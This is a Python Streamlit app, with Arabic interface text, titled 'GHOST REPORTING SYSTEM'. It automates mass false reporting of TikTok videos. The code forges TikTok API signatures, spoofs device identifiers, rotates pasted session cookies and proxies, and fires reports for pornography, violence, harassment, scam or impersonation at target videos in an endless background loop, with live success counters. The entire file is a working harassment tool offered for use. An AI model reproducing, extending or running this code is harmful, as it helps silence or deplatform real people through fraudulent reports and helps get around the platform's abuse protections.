import streamlit as st
import os  

# 1. الحفاظ على قسم استيراد المكتبات والتركيب التلقائي كما هو في الكود الأصلي
try:  
    import requests  
    import binascii  
    import uuid  
    import time  
    import random  
    import secrets  
    import urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
    from urllib.parse import urlencode
    import multiprocessing
    import re
    import datetime
    from MedoSigner import Argus, Gorgon, md5, Ladon  
except:  
    os.system("pip install requests uuid MedoSigner pycryptodome")  
      
import requests  
import binascii  
import uuid  
import time  
import random  
import os  
import secrets  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
from urllib.parse import urlencode
import multiprocessing
import re
import datetime
from MedoSigner import Argus, Gorgon, md5, Ladon  
import threading

# --- إعدادات الواجهة المرعبة جداً ---
st.set_page_config(page_title="GHOST FULL SOURCE v4", page_icon="☠️", layout="wide")

st.markdown("""
    <style>
    /* خلفية سوداء بالكامل وتنسيق مرعب */
    .stApp {
        background-color: #000000;
        color: #ff0000;
        font-family: 'Courier New', Courier, monospace;
    }
    /* تنسيق مربعات الإدخال */
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div {
        background-color: #0d0d0d !important;
        color: #ff0000 !important;
        border: 1px solid #ff0000 !important;
        border-radius: 0px !important;
    }
    /* تنسيق الأزرار */
    .stButton>button {
        background-color: #660000;
        color: white;
        border: 2px solid #ff0000;
        font-weight: bold;
        width: 100%;
        transition: 0.3s;
    }
    .stButton>button:hover {
        background-color: #ff0000;
        color: black;
        box-shadow: 0 0 20px #ff0000;
    }
    h1, h2, h3 {
        color: #ff0000 !important;
        text-shadow: 3px 3px 10px #ff0000;
        text-align: center;
    }
    /* شريط التمرير */
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #000; }
    ::-webkit-scrollbar-thumb { background: #ff0000; }
    </style>
    """, unsafe_allow_html=True)

st.write("<h1>💀 GHOST REPORTING SYSTEM: UNSTOPPABLE 💀</h1>", unsafe_allow_html=True)

# 2. قسم كافة الدوال الأصلية (بدون حذف أي حرف أو دالة)

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):  
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None  
    if not unix: unix = int(time.time())  
    return Gorgon(params, unix, payload, cookie).get_value() | { 
        "x-ladon" : Ladon.encrypt(unix, license_id, aid),
        "x-argus" : Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }  

def get_video_info(link):
    try:
        response = requests.get(
            "https://api16-normal-c-alisg.ttapis.com/tiktok/linker/target/get/v1/",
            params={
                'url': link, 'iid': str(random.randint(1014, 1016)), 'device_id': str(random.randint(1014, 1016)),
                'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503',
                'version_name': '31.5.3', 'device_platform': 'android', 'device_type': 'SM-T505N', 'os_version': '12'
            },
            headers={
                'User-Agent': 'com.zhiliaoapp.musically/2023105030 (Linux; U; Android 12; ar_EG; SM-T505N; Build/SP1A.210812.016; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)',
                'x-argus': 'ahmed mahoz'
            }, timeout=5
        )
        Video = response.json()['landing_url']
        Username = Video.split("https://www.tiktok.com/@")[1].split("/video")[0]
        idVd = Video.split("/video/")[1].split("?")[0]
        
        tikinfo = requests.get(f'https://www.tiktok.com/@{Username}', headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).text
        getting = tikinfo.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
        UserId = getting.split('id":"')[1].split('",')[0]
        return idVd, UserId, Username
    except:
        return None, None, None

def report_video_fast(sessionid, idVd, UserId, report_type, proxy=None, country=None):
    try:
        secret = secrets.token_hex(16)
        cookies = {"sessionid": sessionid, "passport_csrf_token": secret, "passport_csrf_token_default": secret}
        country_code = country if country else random.choice(["US", "GB", "SA", "EG", "YE", "KW", "QA"])
        
        params = {
            'report_type': "video", 'object_id': str(idVd), 'owner_id': str(UserId),
            'reason': report_type['reason'], 'category': report_type['category'],
            'enter_from': "homepage_hot", 'group_id': str(idVd), 'device_platform': "android", 
            'aid': "1233", 'app_name': "musical_ly", 'version_code': "370805", 'ts': str(int(time.time())),
            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)),
            'openudid': str(binascii.hexlify(os.urandom(8)).decode()), 'current_region': country_code,
        }
        
        m = sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023708050",
            'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]
        }
        
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(f"https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/?{urlencode(params)}", 
                                headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
        return '"status_code":0' in response.text
    except:
        return False

# 3. نظام الإرسال المستمر والتحكم بالواجهة (Streamlit Session)
if 'attack_running' not in st.session_state: st.session_state.attack_running = False
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'bad' not in st.session_state: st.session_state.bad = 0

# 4. واجهة الإدخال
with st.sidebar:
    st.header("⚙️ ATTACK PARAMETERS")
    target_user = st.text_input("👤 يوزر المستخدم المستهدف")
    report_opt = st.selectbox("🚫 نوع البلاغ المرعب", [
        "90087 (محتوى جنسي)", "90044 (عنف)", "90045 (تحرش)", 
        "90053 (احتيال وغش)", "90055 (تقليد شخصية)"
    ])
    
    REPORT_MAP = {
        "90087 (محتوى جنسي)": {"reason": "90087", "category": "porn"},
        "90044 (عنف)": {"reason": "90044", "category": "violence"},
        "90045 (تحرش)": {"reason": "90045", "category": "hate"},
        "90053 (احتيال وغش)": {"reason": "90053", "category": "scam"},
        "90055 (تقليد شخصية)": {"reason": "90055", "category": "impersonation"}
    }

col1, col2, col3 = st.columns(3)
with col1:
    sessions_txt = st.text_area("🔑 لصق السيزنات (واحد لكل سطر)", height=300)
with col2:
    proxies_txt = st.text_area("🌐 لصق البروكسيات (IP:Port)", height=300)
with col3:
    links_txt = st.text_area("🔗 لصق روابط الفيديوهات", height=300)

# دالة التشغيل المستمر (Loop)
def run_infinite_attack(sessions, links, r_data, proxies):
    while st.session_state.attack_running:
        for link in links:
            if not st.session_state.attack_running: break
            vd_id, u_id, u_name = get_video_info(link)
            if vd_id:
                for sess in sessions:
                    if not st.session_state.attack_running: break
                    prx = random.choice(proxies) if proxies else None
                    if report_video_fast(sess, vd_id, u_id, r_data, prx):
                        st.session_state.ok += 1
                    else:
                        st.session_state.bad += 1
                    time.sleep(0.01) # سرعة الهجوم

# أزرار التحكم
st.markdown("<br>", unsafe_allow_html=True)
b1, b2 = st.columns(2)

if b1.button("🔥 إطلاق الهجوم بدون توقف"):
    if sessions_txt and links_txt:
        st.session_state.attack_running = True
        s_list = [x.strip() for x in sessions_txt.split('\n') if x.strip()]
        l_list = [x.strip() for x in links_txt.split('\n') if x.strip()]
        p_list = [x.strip() for x in proxies_txt.split('\n') if x.strip()]
        r_data = REPORT_MAP[report_opt]
        
        # تشغيل الهجوم في Thread مستقل لضمان عدم تعليق المتصفح
        threading.Thread(target=run_infinite_attack, args=(s_list, l_list, r_data, p_list), daemon=True).start()
    else:
        st.error("⚠️ خطأ: السيزنات أو الروابط مفقودة!")

if b2.button("🛑 إيقاف الهجوم فوراً"):
    st.session_state.attack_running = False

# 5. عرض النتائج المباشرة (Live Monitoring)
st.markdown("---")
st.write(f"### 📊 الإحصائيات الحية")
res_col1, res_col2 = st.columns(2)
res_col1.metric("ناجح ✅", st.session_state.ok)
res_col2.metric("فاشل ❌", st.session_state.bad)

if st.session_state.attack_running:
    st.markdown("<h3 style='color:green; text-align:center;'>⚡ الهجوم جارٍ الآن في الخلفية...</h3>", unsafe_allow_html=True)
    time.sleep(1)
    st.rerun() # إعادة تشغيل الواجهة لتحديث العدادات
